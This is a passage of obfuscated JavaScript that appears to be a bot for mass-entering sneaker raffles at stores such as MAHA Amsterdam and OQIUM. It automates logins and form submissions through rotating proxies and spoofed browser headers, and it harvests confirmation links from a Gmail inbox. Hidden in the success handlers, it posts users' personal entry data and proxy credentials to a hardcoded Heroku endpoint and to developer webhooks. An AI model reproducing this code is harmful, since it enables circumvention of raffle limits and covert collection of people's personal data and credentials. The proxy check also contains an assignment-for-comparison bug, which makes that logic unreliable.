                            }), await _0x3a6120['goto']('' + _0x33df09[_0x1f9cb7]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x41ed31(0x12c), await _0x3a6120['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3a6120['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x41ed31(0x7d0);
                            try {
                                await _0x3a6120['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x3a6120['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Logging\x20in'), await _0x3a6120['waitForSelector']('#username'), await _0x3a6120['type']('#username', _0x33df09[_0x1f9cb7]['Email']), await _0x3a6120['waitForSelector']('#password'), await _0x3a6120['type']('#password', _0x33df09[_0x1f9cb7]['Password']), await _0x41ed31(0x190), await _0x3a6120['click']('#buttonSubmit'), await _0x3a6120['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x33df09[_0x1f9cb7]['Size']);
                            let _0x17e409 = _0x33df09[_0x1f9cb7]['Size']['replace']('.5', '\x201/2');
                            if (_0x17e409['toUpperCase']() == 'RANDOM') {
                                const _0x286bb7 = await _0x3a6120['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x5b6d94 = Math['round'](Math['random']() * (_0x286bb7['length'] - 0x1));
                                await _0x286bb7[_0x5b6d94]['click']();
                            } else
                                await _0x3a6120['click']('button[aria-label=\x22' + _0x17e409 + '\x22]');
                            await _0x41ed31(0x1f4);
                            try {
                                await _0x3a6120['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x41ed31(0x12c), console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3a6120['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_firstName', _0x33df09[_0x1f9cb7]['FirstName']), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_lastName', _0x33df09[_0x1f9cb7]['LastName']), await _0x41ed31(0x12c), await _0x3a6120['select']('#dwfrm_raffle_addressFields_country', _0x33df09[_0x1f9cb7]['Country']), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_city', _0x33df09[_0x1f9cb7]['City']), await _0x41ed31(0x12c);
                            _0x33df09[_0x1f9cb7]['Postcode'] == undefined && (_0x33df09[_0x1f9cb7]['Postcode'] = _0x33df09[_0x1f9cb7]['Zip']);
                            await _0x3a6120['type']('#dwfrm_raffle_addressFields_postalCode', _0x33df09[_0x1f9cb7]['Postcode']), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_address1', _0x33df09[_0x1f9cb7]['Address1']), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_address2', _0x33df09[_0x1f9cb7]['HouseNumber']), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x33df09[_0x1f9cb7]['Address2']), await _0x41ed31(0x12c), await _0x3a6120['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x41ed31(0x12c), await _0x3a6120['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x33df09[_0x1f9cb7]['Follower']), await _0x41ed31(0x1f4), await _0x3a6120['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20' + _0x3dfcf2['blue']('Awaiting\x20Paypal\x20Payment')), await _0x3a6120['click']('.b-paypal_button');
                            try {
                                await _0x3a6120['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x316510 = 'no', _0x13e83d(_0x33df09[_0x1f9cb7], _0x2e2965), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2feb7b['succesDEVMSG']);
                                await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x2feb7b['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x2feb7b['succesPUBMSG']);
                                let _0x4bf558 = _0x33df09[_0x1f9cb7];
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'module': _0x2e2965['name'],
                                        'entrydata': JSON['stringify'](_0x4bf558),
                                        'proxy': '' + _0x124c9c[_0x1f9cb7]
                                    };
                                    var _0x47d16b = JSON['stringify'](prxdata);
                                    let _0x3b0a2a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x47d16b, _0x3b0a2a);
                                } catch (_0x58e5c5) {
                                }
                            } catch (_0x4eedf8) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4eedf8)), _0x4223f1 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4eedf8;
                                var _0x485d8f = await _0x559dec(_0x33df09[_0x1f9cb7], _0x2e2965, 'dev', !![], _0x4223f1);
                                _0x2feb7b['errorDEV'] = { 'embeds': [_0x485d8f] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2feb7b['errorDEV']), await _0x48936e(_0x36657d, _0x2feb7b['errorDEV']);
                            }
                        } catch (_0x1b2601) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20' + _0x1b2601)), _0x4223f1 = '' + _0x1b2601;
                            var _0x485d8f = await _0x559dec(_0x33df09[_0x1f9cb7], _0x2e2965, 'dev', !![], _0x4223f1);
                            _0x2feb7b['errorDEV'] = { 'embeds': [_0x485d8f] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2feb7b['errorDEV']), await _0x48936e(_0x36657d, _0x2feb7b['errorDEV']), _0x316510 = 'yes';
                        } finally {
                            _0x209ff2 && _0x209ff2['close']();
                            if (_0x316510 == 'yes' && _0x3441d9 != 0x5) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x2e2965['name'] + ']\x20Task\x20' + (_0x1f9cb7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3441d9 + '\x20/\x205)')), _0x1f9cb7 = _0x1f9cb7 - 0x1, _0x3441d9 = _0x3441d9 + 0x1;
                                continue;
                            }
                            _0x316510 == 'yes' && _0x3441d9 >= 0x5 && (_0x2504ad(_0x33df09[_0x1f9cb7], _0x2e2965), _0x316510 = 'no', _0x3441d9 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['AfewDelay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xde7b0, _0x384531, _0x903072) {
                    for (var _0x4c0e21 = 0x0; _0x4c0e21 < _0x384531['length']; _0x4c0e21++) {
                        try {
                            await _0x101e1b(_0x384531, _0x4c0e21);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x9d328f(_0xe33eb9, _0x47c729, _0x36566b, _0x54b663, _0x3df4d9) {
                            var _0x57f070, _0x4b4a01 = {}, _0x211b08 = [], _0x21249b = {}, _0x33aa20 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x5ab30a = Math['round'](Math['random']() * (_0x33aa20['length'] - 0x1));
                            !_0x54b663 && (_0x54b663 = {});
                            if (_0x47c729 != 'ver') {
                                _0x445891(_0x36566b['name'] + '\x20Task\x20' + (_0xe33eb9 + 0x1) + '\x20/\x20' + _0x54b663['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5), await _0x101e1b(_0x54b663, _0xe33eb9), _0x4b4a01 = _0x36566b['data'], _0x4b4a01['data']['attributes']['email'] = '' + _0x54b663[_0xe33eb9]['Email'];
                                if (_0x54b663[_0xe33eb9]['Size'] == 'RANDOM') {
                                }
                                _0x4b4a01['data']['attributes']['properties']['$first_name'] = '' + _0x54b663[_0xe33eb9]['FirstName'], _0x4b4a01['data']['attributes']['properties']['$last_name'] = '' + _0x54b663[_0xe33eb9]['LastName'], _0x4b4a01['data']['attributes']['properties']['$address1'] = _0x54b663[_0xe33eb9]['Address1'] + '\x20' + _0x54b663[_0xe33eb9]['Address2'] + '\x20' + _0x54b663[_0xe33eb9]['HouseNumber'], _0x4b4a01['data']['attributes']['properties']['$zip'] = '' + _0x54b663[_0xe33eb9]['Zip'], _0x4b4a01['data']['attributes']['properties']['$city'] = '' + _0x54b663[_0xe33eb9]['City'], _0x4b4a01['data']['attributes']['properties']['$country'] = '' + _0x54b663[_0xe33eb9]['Country'], _0x54b663[_0xe33eb9]['Size'] == 'RANDOM' ? _0x4b4a01['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x33aa20[_0x5ab30a] : _0x4b4a01['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x54b663[_0xe33eb9]['Size'], _0x4b4a01['data']['attributes']['properties']['$phone_number'] = '' + _0x54b663[_0xe33eb9]['Phone'], _0x4b4a01['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x54b663[_0xe33eb9]['Follower'];
                            }
                            if (_0x4ae33b['useRandomProxy'] = ![])
                                var _0x47ae0c = _0x3df4d9[_0xe33eb9]['split'](':');
                            else
                                var _0x1d0182 = Math['round'](Math['random']() * (_0x3df4d9['length'] - 0x1)), _0x47ae0c = _0x3df4d9[_0x1d0182]['split'](':');
                            var _0x2c91a2 = {
                                'jar': _0x22e099,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x36566b['url'],
                                'headers': _0x36566b['headers'],
                                'body': JSON['stringify'](_0x4b4a01),
                                'proxy': 'http://' + _0x47ae0c[0x2] + ':' + _0x47ae0c[0x3] + '@' + _0x47ae0c[0x0] + ':' + _0x47ae0c[0x1]
                            };
                            return _0x47c729 != 'ver' && (_0x2c91a2['url'] = _0x36566b['url'], _0x2c91a2['headers'] = _0x36566b['headers']), _0x47c729 == 'ver' && (_0x2c91a2['method'] = 'GET'), new Promise(function (_0x2757d5, _0x8ca483) {
                                callback = async (_0x1699d0, _0x4c9731, _0x3159c3) => {
                                    if (!_0x1699d0 && _0x4c9731['statusCode'] == 0xca || !_0x1699d0 && _0x4c9731['statusCode'] == 0xc8) {
                                        if (_0x47c729 != 'ver') {
                                            var _0x46ba6b = await _0x559dec(_0x54b663[_0xe33eb9], _0x36566b, 'dev', ![]), _0x36f1c0 = await _0x559dec(_0x54b663[_0xe33eb9], _0x36566b, 'pub', ![]);
                                            const _0x354a34 = {
                                                'succesDEVMSG': { 'embeds': [_0x46ba6b] },
                                                'succesPUBMSG': { 'embeds': [_0x36f1c0] }
                                            };
                                            let _0x20ede1 = _0x54b663[_0xe33eb9];
                                            try {
                                                prxdata = {
                                                    'username': _0x128b96['replace']('#', ''),
                                                    'module': _0x36566b['name'],
                                                    'entrydata': JSON['stringify'](_0x20ede1),
                                                    'proxy': '' + _0x3df4d9[_0xe33eb9]
                                                };
                                                var _0x31ed8d = JSON['stringify'](prxdata);
                                                let _0x210cf3 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x31ed8d, _0x210cf3);
                                            } catch (_0x92b6c0) {
                                            }
                                            if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                                                try {
                                                    await _0x48936e(_0x4ae33b['webhook'], _0x354a34['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x354a34['succesDEVMSG']), await _0x41ed31(0xc8);
                                            try {
                                                await _0x48936e(_0x22a07c, _0x354a34['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x13e83d(_0x54b663[_0xe33eb9], _0x36566b);
                                        }
                                        _0x2757d5(console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x36566b['name'] + ']\x20Task\x20' + (_0xe33eb9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x47c729 != 'ver') {
                                            var _0x28d979 = '' + _0x1699d0, _0x59f2e5 = await _0x559dec(_0x54b663[_0xe33eb9], _0x36566b, 'dev', !![], _0x28d979), _0x276b67 = {};
                                            _0x276b67['errorDEV'] = { 'embeds': [_0x59f2e5] }, _0x2504ad(_0x54b663[_0xe33eb9], _0x36566b), _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x276b67['errorDEV']), await _0x48936e(_0x36657d, _0x276b67['errorDEV']);
                                        }
                                        _0x8ca483(console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x36566b['name'] + ']\x20Task\x20' + (_0xe33eb9 + 0x1) + ':\x20' + _0x1699d0)));
                                    }
                                };
                                try {
                                    _0x47c729 != 'ver' && console['log'](_0x82e5a5() + '\x20[' + _0x36566b['name'] + ']\x20Task\x20' + (_0xe33eb9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4b4a01['data']['attributes']['email']), _0x475f73(_0x2c91a2, callback);
                                } catch (_0x27c4b0) {
                                    console['log'](_0x82e5a5() + '\x20Task\x20' + (_0xe33eb9 + 0x1) + ':\x20' + _0x27c4b0);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x9d328f(_0x4c0e21, 'nor', _0xde7b0, _0x384531, _0x903072), console['log'](_0x82e5a5() + '\x20[' + _0xde7b0['name'] + ']\x20Sleeping\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        } catch (_0x51a981) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1fd776, _0x1516f8, _0x3b6e8d) {
                    var _0x26324d = [], _0x19ee2b = ![];
                    async function _0x3ce403() {
                        var _0x298061 = new _0x2fa2c3({
                            'user': _0x4ae33b['masterMail'],
                            'password': _0x4ae33b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x439f99(_0x1cfa50) {
                            _0x298061['openBox']('INBOX', ![], _0x1cfa50);
                        }
                        _0x298061['once']('ready', function () {
                            _0x439f99(function (_0x3cfba7, _0x452de5) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3cfba7)
                                    throw _0x3cfba7;
                                _0x298061['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x250590, _0x39142a) {
                                    if (!_0x39142a || !_0x39142a['length'])
                                        console['log'](_0x82e5a5() + '\x20[' + _0x1fd776['name'] + ']\x20No\x20mails\x20found'), _0x298061['end']();
                                    else {
                                        var _0x59ee1e = _0x298061['seq']['fetch'](_0x39142a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x59ee1e['on']('message', function (_0x49bbc9, _0x4aee86) {
                                            var _0x47a533 = '(#' + _0x4aee86 + ')\x20';
                                            _0x49bbc9['on']('body', function (_0x239e34, _0x1c706c) {
                                                _0x44103a(_0x239e34, (_0x417831, _0x54dfd3) => {
                                                    var _0x1de8fe = _0x54dfd3['text']['split']('(')[0x1], _0x541588 = _0x1de8fe['split'](')')[0x0];
                                                    _0x26324d['push'](_0x541588);
                                                });
                                            }), _0x49bbc9['once']('end', function () {
                                            });
                                        }), _0x59ee1e['once']('error', function (_0x3f3e6b) {
                                            console['log']('Fetch\x20error:\x20' + _0x3f3e6b), _0x19ee2b = !![];
                                        }), _0x59ee1e['once']('end', function () {
                                            _0x298061['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x298061['once']('error', function (_0x4557fc) {
                            console['log'](_0x3dfcf2['red'](_0x4557fc['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x19ee2b = !![];
                        }), _0x298061['once']('end', async function () {
                            _0x19ee2b = !![];
                        }), _0x298061['connect']();
                    }
                    async function _0x37b589(_0x3ea6b6, _0x32fdaa, _0x2c21e4) {
                        for (var _0x2298f2 = 0x0; _0x2298f2 < _0x32fdaa['length']; _0x2298f2++) {
                            async function _0x2076cc(_0x1fda78, _0x6755e5, _0x211cee, _0xab8be9, _0x49d26f) {
                                var _0x17f28c, _0xe46ff7 = {}, _0x3c35bb = [], _0x1f3104 = {}, _0x1cd3f2 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x12c93a = Math['round'](Math['random']() * (_0x1cd3f2['length'] - 0x1));
                                _0xab8be9[_0x1fda78]['Size'] == 'RANDOM' && (_0xab8be9[_0x1fda78]['Size'] = _0x1cd3f2[_0x12c93a]);
                                !_0xab8be9 && (_0xab8be9 = {});
                                if (_0x4ae33b['useRandomProxy'] = ![])
                                    var _0x5ebf22 = _0x49d26f[_0x1fda78]['split'](':');
                                else
                                    var _0x5bec72 = Math['round'](Math['random']() * (_0x49d26f['length'] - 0x1)), _0x5ebf22 = _0x49d26f[_0x5bec72]['split'](':');
                                var _0x1c57ac = {
                                    'jar': _0x22e099,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x211cee['url'],
                                    'headers': _0x211cee['headers'],
                                    'body': JSON['stringify'](_0xe46ff7),
                                    'proxy': 'http://' + _0x5ebf22[0x2] + ':' + _0x5ebf22[0x3] + '@' + _0x5ebf22[0x0] + ':' + _0x5ebf22[0x1]
                                };
                                return _0x6755e5 != 'ver' && (_0x1c57ac['url'] = _0x211cee['url'], _0x1c57ac['headers'] = _0x211cee['headers']), _0x6755e5 == 'ver' && (_0x1c57ac['method'] = 'GET', _0x1c57ac['url'] = _0xab8be9[_0x1fda78]), new Promise(function (_0x41cfd6, _0x4e594b) {
                                    callback = async (_0x49f373, _0x254869, _0x14910b) => {
                                        if (!_0x49f373 && _0x254869['statusCode'] == 0xca || !_0x49f373 && _0x254869['statusCode'] == 0xc8) {
                                            if (_0x6755e5 != 'ver') {
                                                var _0xf1d7e5 = await _0x559dec(_0xab8be9[_0x1fda78], _0x211cee, 'dev', ![]), _0x3e1f02 = await _0x559dec(_0xab8be9[_0x1fda78], _0x211cee, 'pub', ![]);
                                                const _0x4dda06 = {
                                                    'succesDEVMSG': { 'embeds': [_0xf1d7e5] },
                                                    'succesPUBMSG': { 'embeds': [_0x3e1f02] }
                                                };
                                                if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                                                    try {
                                                        await _0x48936e(_0x4ae33b['webhook'], _0x4dda06['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x4dda06['succesDEVMSG']), await _0x41ed31(0xc8);
                                                try {
                                                    await _0x48936e(_0x22a07c, _0x4dda06['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x13e83d(_0xab8be9[_0x1fda78], _0x211cee);
                                            }
                                            _0x41cfd6(console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x211cee['name'] + ']\x20Task\x20' + (_0x1fda78 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x6755e5 != 'ver') {
                                                var _0x2ecd18 = '' + _0x49f373, _0x4d65e5 = await _0x559dec(_0xab8be9[_0x1fda78], _0x211cee, 'dev', !![], _0x2ecd18), _0x5b64b3 = {};
                                                _0x5b64b3['errorDEV'] = { 'embeds': [_0x4d65e5] }, _0x2504ad(_0xab8be9[_0x1fda78], _0x211cee), _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x5b64b3['errorDEV']), await _0x48936e(_0x36657d, _0x5b64b3['errorDEV']);
                                            }
                                            _0x4e594b(console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x211cee['name'] + ']\x20Task\x20' + (_0x1fda78 + 0x1) + ':\x20' + _0x49f373)));
                                        }
                                    };
                                    try {
                                        _0x6755e5 != 'ver' ? console['log'](_0x82e5a5() + '\x20[' + _0x211cee['name'] + ']\x20Task\x20' + (_0x1fda78 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xe46ff7['data']['attributes']['email']) : console['log'](_0x82e5a5() + '\x20[' + _0x211cee['name'] + ']\x20Task\x20' + (_0x1fda78 + 0x1) + ':\x20Fetching\x20Response'), _0x475f73(_0x1c57ac, callback);
                                    } catch (_0x35d21e) {
                                        console['log'](_0x82e5a5() + '\x20Task\x20' + (_0x1fda78 + 0x1) + ':\x20' + _0x35d21e);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2076cc(_0x2298f2, 'ver', _0x3ea6b6, _0x32fdaa, _0x2c21e4), console['log'](_0x82e5a5() + '\x20[' + _0x3ea6b6['name'] + ']\x20Sleeping\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                            } catch (_0xe9542b) {
                            }
                        }
                    }
                    try {
                        _0x3ce403();
                        while (!_0x19ee2b) {
                            await _0x41ed31(0xbb8);
                        }
                        console['log']('Found\x20' + _0x26324d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ed31(0x9c4);
                    }
                    await _0x37b589(_0x1fd776, _0x26324d, _0x3b6e8d);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x47eec1, _0x599e2c, _0x6be784) {
                    var _0x28fa69 = _0x599e2c, _0x4d65a0 = 0x0;
                    for (var _0x5c9fa2 = 0x0; _0x5c9fa2 < _0x599e2c['length']; _0x5c9fa2++) {
                        maxTasks = _0x4ae33b['threads'];
                        while (_0x4d65a0 >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        async function _0x571422(_0x2c6f75, _0x391836, _0xc9ed19, _0x955451) {
                            try {
                                await _0x101e1b(_0x391836, _0x955451);
                            } catch (_0x31258d) {
                                throw new Error(_0x31258d);
                            }
                            async function _0x35d641(_0x4c414f, _0x263dca, _0x397dcf, _0x56bd4e, _0xa78f78) {
                                _0x4d65a0++;
                                var _0x36ba1f, _0x5840c2 = {}, _0x9bb5d3 = [], _0x1d4eab = {}, _0x524aea = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0xd3cea7 = Math['round'](Math['random']() * (_0x524aea['length'] - 0x1));
